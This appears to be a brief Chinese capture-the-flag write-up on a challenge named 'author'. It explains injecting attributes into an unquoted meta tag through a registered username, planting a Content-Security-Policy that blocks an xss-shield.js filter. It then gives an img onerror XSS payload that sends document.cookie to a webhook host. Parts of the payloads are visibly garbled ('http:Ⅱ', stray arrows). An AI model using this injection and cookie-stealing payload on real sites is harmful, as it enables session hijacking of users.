---
tags: [XSS, CSP绕过, HTML属性注入, 标签注入, 源码审计]
---

# author

主要就是绕过xss-shield.js， 没有csp

<meta  name= "author "  content=<?php  echo  $pageAuthor;  ?>>

header.php 中 author name 可以注入向 meta 标签中注入空格， 可以添加任意属性。

尝试构造成 CSP 拦截 xss.shiled.js 。

注册用户时在 username 中写入 csp 内容拦截xss：

```
username='script-src-elem <http:Ⅱblog-app/assets/js/article.js>' [http](http) -

equiv=Content-Security-Policy
```

 单引号不会被 html 实体化 正好用来包裹 csp 内容 。 script-src-elem 属性不会影响 unsafe- inline， 只需要设置 article.js 的 URL 即可。

随后用该账号登录发布的 article 不会有任何限制。使用 img onerror 外带：

```
<img  src=x  onerror="fetch('<http:Ⅱwebhook/?d →'  +
encodeURI(document .cookie)) ">
```

